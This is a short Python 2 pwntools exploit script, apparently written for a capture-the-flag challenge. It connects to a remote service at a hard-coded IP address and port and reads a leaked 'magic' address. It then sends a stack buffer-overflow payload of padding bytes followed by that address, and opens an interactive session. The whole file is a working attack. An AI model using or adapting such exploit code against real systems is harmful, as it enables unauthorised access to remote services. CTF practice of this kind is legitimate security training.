#!/usr/bin/env python2

from pwn import *
from qpwn import *
context(os='linux', log_level='debug')
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if args.INFO:
    context.log_level = 'info'
    
p = remote('111.198.29.45', 53294)
init(p, elf, context, args)
make_alias(p)

if __name__ == '__main__':
    import sys
    num = int(sys.argv[1])
    print num
    # num == 72
    p.ru(':')
    magic = int(p.rl().strip(), 16)
    payload = 'a' * num + p64(magic)
    p.sl(payload)
    p.i()
